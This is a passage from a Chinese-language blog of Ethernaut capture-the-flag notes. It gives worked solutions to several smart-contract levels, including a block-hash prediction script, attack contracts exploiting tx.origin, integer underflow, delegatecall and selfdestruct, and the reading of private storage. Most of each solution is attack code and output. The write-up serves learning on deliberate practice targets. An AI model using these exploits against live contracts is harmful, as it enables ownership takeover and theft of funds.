class="string">&#x27;0x94099942864EA81cCF197E9D71ac53310b1468D8&#x27;</span></span><br><span class="line">contract2 = web3.eth.contract(abi=abi, address=address)</span><br><span class="line"><span class="built_in">print</span>(contract2.functions.consecutiveWins().call())</span><br><span class="line"></span><br><span class="line">FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing: %d&#x27;</span> % i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[Log] %d&#x27;</span> % web3.eth.get_balance(player))</span><br><span class="line">    nonce = <span class="built_in">int</span>(web3.eth.get_transaction_count(account.address))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[Log] nonce: %d&#x27;</span> % nonce)</span><br><span class="line">    num = web3.eth.block_number</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[Log] num: %d&#x27;</span> % num)</span><br><span class="line">    blockValue = <span class="built_in">int</span>(web3.eth.get_block(num).<span class="built_in">hash</span>.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    side = blockValue &gt;= FACTOR</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[Log] side: %s&#x27;</span> % side)</span><br><span class="line">    functionEncode = contract2.encodeABI(fn_name=<span class="string">&quot;flip&quot;</span>, args=[side])</span><br><span class="line">    tx = &#123;</span><br><span class="line">        <span class="string">&#x27;chainId&#x27;</span>: chainId,</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">        <span class="string">&#x27;gasPrice&#x27;</span>: <span class="built_in">int</span>(<span class="number">5000000</span>),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span>: <span class="built_in">int</span>(<span class="number">500000</span>),</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: <span class="built_in">int</span>(<span class="number">0</span>),</span><br><span class="line">        <span class="string">&#x27;from&#x27;</span>: player,</span><br><span class="line">        <span class="string">&#x27;to&#x27;</span>: address,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: functionEncode,</span><br><span class="line">    &#125;</span><br><span class="line">    sign = web3.eth.account.sign_transaction(tx, sk)</span><br><span class="line">    hashTx = web3.eth.send_raw_transaction(sign.rawTransaction).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[Log] Sending transaction ...&#x27;</span>)</span><br><span class="line">    result = web3.eth.wait_for_transaction_receipt(hashTx)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    win = contract2.functions.consecutiveWins().call()</span><br><span class="line">    <span class="built_in">print</span>(win)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"><span class="comment"># 10</span></span><br></pre></td></tr></table></figure>
<p>返回浏览器提交即可</p>
<h3 id="坑">坑<a class="anchor" href="#坑">·</a></h3>
<p>记一下之前在公链上搞踩过的坑，在调代码的时候，好像是签名了但交易没发出去或者发出去被中断时，因为交易没发出去，所以<code>web3.eth.get_transaction_count(account.address)</code>并没增加，但是不知道为啥实际上这个<code>nonce</code>已经被占用，导致报<code>replacement transaction underpriced</code>错误</p>
<p>手动增加<code>nonce</code>虽然没报错，但实际上因为前面交易没完成所以会一直在排队，增加到一定数量的话甚至会导致<code>queued cost</code>过高</p>
<p>正确的解决方法是，使用之前堵住的<code>nonce</code>，然后把<code>gasPrice</code>调高，用更高的<code>gasPrice</code>覆盖原来的交易，可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wahaha13168/article/details/82917911">这里</a></p>
<h2 id="Solidity方法">Solidity方法<a class="anchor" href="#Solidity方法">·</a></h2>
<p>推荐使用在线的<a target="_blank" rel="noopener" href="http://remix.ethereum.org/">Remix-IDE</a>编写、编译、部署Solidity的代码。</p>
<p>首先新建个文件，比如我叫<code>hack.sol</code>，然后写上攻击代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// https://learnblockchain.cn/question/2206</span><br><span class="line">interface CoinFlip &#123;</span><br><span class="line">  function consecutiveWins() external returns (uint256);</span><br><span class="line">  function flip(bool) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">  event Log(string);</span><br><span class="line">  event Log(uint256);</span><br><span class="line">  event Log(bool);</span><br><span class="line"></span><br><span class="line">  address cf_addr = 0x94099942864EA81cCF197E9D71ac53310b1468D8;</span><br><span class="line">  CoinFlip cf = CoinFlip(cf_addr);</span><br><span class="line"></span><br><span class="line">  function flip() public &#123;</span><br><span class="line">    emit Log(block.number - 1);</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">    emit Log(blockValue);</span><br><span class="line"></span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line">    emit Log(side);</span><br><span class="line">    cf.flip(side);</span><br><span class="line">    emit Log(cf.consecutiveWins());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flipN(uint n) public &#123;</span><br><span class="line">    for (uint i=0; i&lt;n; i++) &#123;</span><br><span class="line">      flip();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>interface CoinFlip</code>是题目合约的接口，用来调用题目的<code>CoinFlip</code>的函数，里面函数都要<code>external</code>，不然会报错，可以参考：<a target="_blank" rel="noopener" href="https://learnblockchain.cn/question/2206">这里</a></p>
<p><code>cf_addr</code>是题目合约地址，<code>flip()</code>就是算一次<code>side</code>然后提交到题目的<code>cf.flip(side)</code>，<code>flipN</code>就是做<code>n</code>次<code>flip()</code>，<code>Log</code>就是打log</p>
<p>保存后点Remix左边的编译器，选择0.8.0，然后编译</p>
<img src="/p/Ethernaut-note/image-20230919145157646.png" class="" title="img_image-20230919145157646">
<p>PS：编译完后，同一个页面的下面可以复制这个合约的<code>ABI</code>和<code>Bytecode</code>，不过暂时没啥用</p>
<p>编译完后Remix左边点到部署页面，环境选MetaMask，在MetaMask里切换好账户和网络，合约选刚才的<code>hack.sol</code>，<code>GAS</code>啥的自己看着设就好，然后点击部署，交钱</p>
<img src="/p/Ethernaut-note/image-20230919145533501.png" class="" title="img_image-20230919145533501">
<p>部署完成后下面“已部署的合约”中可以和这个合约交互</p>
<img src="/p/Ethernaut-note/image-20230919145651392.png" class="" title="img_image-20230919145651392">
<p>先点个<code>flip</code>试试，交钱，然后Remix右下角那个区域会出现这个交易的信息，点开翻到<code>logs</code>，可以看到刚才<code>Log</code>对应的输出，比如最后一个是<code>Log(cf.consecutiveWins())</code>，可以看到输出显示<code>consecutiveWins</code>变成了<code>1</code></p>
<p>![屏幕截图 2023-09-19 150005](Ethernaut-note/屏幕截图 2023-09-19 150005.png)</p>
<p>单测成功，但是后来在<code>flipN</code>中输大于等于<code>2</code>的<code>n</code>会报<code>Transaction reverted without a reason string</code>，不知道是不是异步的问题，留坑</p>
<p>手动按10次<code>flip</code>算了</p>
<p>PS：如果多的话还是需要在JS或Python中调用这个合约，算是一种不太方便的方法</p>
<h1 id="04-Telephone">04_Telephone<a class="anchor" href="#04-Telephone">·</a></h1>
<p>获得下面合约来完成这一关</p>
<p>这可能有用</p>
<ul>
<li>参阅帮助页面,在 <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/help">“Beyond the console”</a> 部分</li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看看<code>owner</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="comment">// &#x27;0x8A791620dd6260079BF849Dc5567aDC3F2FdC318&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>tx.origin</code>是最初的调用者，<code>msg.sender</code>是上一级的调用者，如果在别的合约中调用<code>changeOwner</code>，则<code>tx.origin</code>是<code>player</code>，<code>msg.sender</code>是这个合约，造成<code>tx.origin</code>和<code>msg.sender</code>不一致，获得所有权，参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2152791">这里</a></p>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function owner() external;</span><br><span class="line">  function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  address addr = 0x8aCd85898458400f7Db866d53FCFF6f0D49741FF;</span><br><span class="line"></span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    Telephone tp = Telephone(addr);</span><br><span class="line">    tp.changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Remix部署，然后<code>hack</code>一下，再看看<code>owner</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="comment">// &#x27;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&#x27;</span></span><br></pre></td></tr></table></figure>
<p>提交</p>
<p>提交后显示：</p>
<img src="/p/Ethernaut-note/image-20230919164440610.png" class="" title="img_image-20230919164440610">
<p>比如<a target="_blank" rel="noopener" href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/">this</a>.</p>
<h1 id="05-Token">05_Token<a class="anchor" href="#05-Token">·</a></h1>
<p>这一关的目标是攻破下面这个基础 token 合约</p>
<p>你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好</p>
<p>这可能有帮助:</p>
<ul>
<li>什么是 odometer?</li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整数下溢，转走<code>21</code>块就好，首先看看余额</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">await</span> contract.balanceOf(player)).words[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// 20</span></span><br></pre></td></tr></table></figure>
<p>然后给一个虚构的<code>play2</code>转账<code>21</code>块</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">play2 = <span class="string">&#x27;0x0000000000000000000000000000000000000000&#x27;</span>;</span><br><span class="line"><span class="keyword">await</span> contract.transfer(play2, <span class="number">21</span>);</span><br></pre></td></tr></table></figure>
<p>再看看余额，发生了溢出</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">await</span> contract.balanceOf(player)).words[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// 67108863</span></span><br></pre></td></tr></table></figure>
<p>提交后：</p>
<img src="/p/Ethernaut-note/image-20230919165257392.png" class="" title="img_image-20230919165257392">
<h1 id="06-Delegation">06_Delegation<a class="anchor" href="#06-Delegation">·</a></h1>
<p>这一关的目标是申明你对你创建实例的所有权.</p>
<p>这可能有帮助</p>
<ul>
<li>仔细看solidity文档关于 <code>delegatecall</code> 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响.</li>
<li>Fallback 方法</li>
<li>方法 ID</li>
</ul>
<p>题目代码；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接看到<code>fallback</code>里有<code>delegatecall</code> （委托调用）</p>
<p><code>delegatecall</code> 大概解释是，可以用来调用外部合约的方法，但是仅调用了外部合约的代码（code），所用的全局变量还是本合约中的变量，即可以调用外部代码修改本地变量，更多<code>delegatecall</code> 的解释可以参考：<a target="_blank" rel="noopener" href="https://learnblockchain.cn/article/5372">这里</a></p>
<p>在这个题中，调用<code>Delegate</code>里的<code>pwn()</code>可以获得所有权，而<code>Delegation</code>中的<code>fallback</code>里可以使用<code>delegatecall</code>调用<code>Delegate</code>里的<code>pwn()</code>，按上面所说，只会执行<code>Delegate</code>的代码，变量的修改还是在<code>Delegation</code>，所以即可以获得<code>Delegation</code>的所有权</p>
<p>问题剩下，怎么调用<code>Delegate</code>里的<code>pwn()</code>，在<code>web3.js</code>中可以通过<code>web3.eth.abi.encodeFunctionSignature('pwn()')</code>获得调用<code>pwn()</code>的<code>ABI</code>，然后把这个<code>ABI</code>放到<code>data</code>中做交易即可</p>
<p>首先看看原<code>owner</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="comment">// &#x27;0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e&#x27;</span></span><br></pre></td></tr></table></figure>
<p>然后委托调用<code>pwn()</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> contract2 = <span class="keyword">new</span> web3.eth.Contract(contract.abi, contract.address);</span><br><span class="line"><span class="keyword">const</span> sk = <span class="string">&#x27;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> tx = &#123;</span><br><span class="line">    <span class="attr">gas</span>: <span class="number">300000</span>,</span><br><span class="line">    <span class="attr">to</span>: contract.address,</span><br><span class="line">    <span class="attr">data</span>: web3.eth.abi.encodeFunctionSignature(<span class="string">&#x27;pwn()&#x27;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> sign = <span class="keyword">await</span> web3.eth.accounts.signTransaction(tx, sk);</span><br><span class="line"><span class="keyword">var</span> result = <span class="keyword">await</span> web3.eth.sendSignedTransaction(sign.rawTransaction);</span><br></pre></td></tr></table></figure>
<p>再看看<code>owner</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="string">&#x27;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&#x27;</span></span><br></pre></td></tr></table></figure>
<p>提交即可</p>
<img src="/p/Ethernaut-note/image-20230920135016288.png" class="" title="img_image-20230920135016288">
<p>参见 <a target="_blank" rel="noopener" href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7">The Parity Wallet Hack Explained</a></p>
<h1 id="07-Force">07_Force<a class="anchor" href="#07-Force">·</a></h1>
<p>有些合约就是拒绝你的付款,就是这么任性 <code>¯\_(ツ)_/¯</code></p>
<p>这一关的目标是使合约的余额大于0</p>
<p>这可能有帮助:</p>
<ul>
<li>Fallback 方法</li>
<li>有时候攻击一个合约最好的方法是使用另一个合约.</li>
<li>阅读上方的帮助页面, <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/help">“Beyond the console”</a> 部分</li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>
<p>（这不是什么都没写吗-）</p>
<p>可以在攻击合约中调用自毁函数<code>selfdestruct</code>发起强制转账，参考：<a target="_blank" rel="noopener" href="https://learnblockchain.cn/article/3331">这里</a></p>
<p>部署攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  address payable vicAddr = payable(0xf41B47c54dEFF12f8fE830A411a09D865eBb120E);</span><br><span class="line"></span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function transfer() public payable &#123;</span><br><span class="line">    payable(address(this)).transfer(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    selfdestruct(vicAddr);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PS：没有<code>receive</code>函数的话转钱好像会报错，另外收钱的函数还要加<code>payable</code>（部署后在Remix中这个函数的按钮会显示红色），参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Fortunater/p/14335187.html">这里</a>和<a target="_blank" rel="noopener" href="https://docs.soliditylang.org/zh/v0.8.17/security-considerations.html#id5">这里</a></p>
<p>Remix中在<code>以太币数量</code>上填点钱（这里输入到合约中是<code>msg.value</code>），然后点击<code>transfer</code>转账，确认攻击合约收到钱后点<code>hack</code>触发自毁，然后把钱转到题目合约中</p>
<p>再查看题目合约的余额</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getBalance(contract.address)</span><br><span class="line"><span class="comment">// &#x27;100&#x27;</span></span><br></pre></td></tr></table></figure>
<p>提交</p>
<img src="/p/Ethernaut-note/image-20230920150548098.png" class="" title="img_image-20230920150548098">
<h1 id="08-Vault">08_Vault<a class="anchor" href="#08-Vault">·</a></h1>
<p>打开 vault 来通过这一关!</p>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>翻了一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/forkroad/p/16410381.html">这里</a>虽然说<code>bytes</code>没有内置比较函数，但试了一下<code>==</code>是可行的（可能是因为<code>bytes32</code>直接定了长度，所以直接比较内存），所以应该不是<code>==</code>的漏洞</p>
<p>那应该就是<code>password</code>的问题，本来设想可以找到这个合约部署的区块来获得<code>_password</code>的输入，但是生成实例的交易只是生成实例的，部署的区块应该是平台开始的时候的那堆区块，翻起来有点麻烦，就算了</p>
<p>后来发现<code>web3.eth.getStorageAt</code>可以直接获得合约的内存，包括私有变量，所以可以直接获得<code>bytes32 private password</code>，提交解锁，具体参考：<a target="_blank" rel="noopener" href="https://ethereum.stackexchange.com/questions/133851/is-it-safe-to-create-a-password-in-a-smart-contract">这里</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> password = <span class="keyword">await</span> web3.eth.getStorageAt(contract.address, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">await</span> contract.unlock(password);</span><br><span class="line"><span class="keyword">await</span> contract.locked()</span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>提交即可</p>
<img src="/p/Ethernaut-note/image-20230921114724009.png" class="" title="img_image-20230921114724009">
<p><a target="_blank" rel="noopener" href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/">zk-SNARKs</a></p>
<p>PS：马克一下折腾时用到的一些命令，万一以后有用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拿合约ByteCode</span></span><br><span class="line"><span class="comment">// 在线反汇编：https://ethervm.io/decompile/</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.getCode(contract.address)</span><br><span class="line"><span class="comment">// 拿区块，默认最上一块，否则输入块号</span></span><br><span class="line"><span class="keyword">var</span> block = <span class="keyword">await</span> web3.eth.getBlock();</span><br><span class="line"><span class="comment">// 拿输入，需要拿交易数据，交易Hash可以在区块信息中拿到</span></span><br><span class="line">(<span class="keyword">await</span> web3.eth.getTransaction(block.transactions[<span class="number">0</span>])).input;</span><br><span class="line"><span class="comment">// 拿合约号、输出等信息</span></span><br><span class="line">(<span class="keyword">await</span> web3.eth.getTransactionReceipt(block.transactions[<span class="number">0</span>])).contractAddress</span><br></pre></td></tr></table></figure>
<h1 id="09-King">09_King<a class="anchor" href="#09-King">·</a></h1>
<p>下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.</p>
<p>这么有趣的游戏, 你的目标是攻破他.</p>
<p>当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.</p>
<p>题目代码：</p>
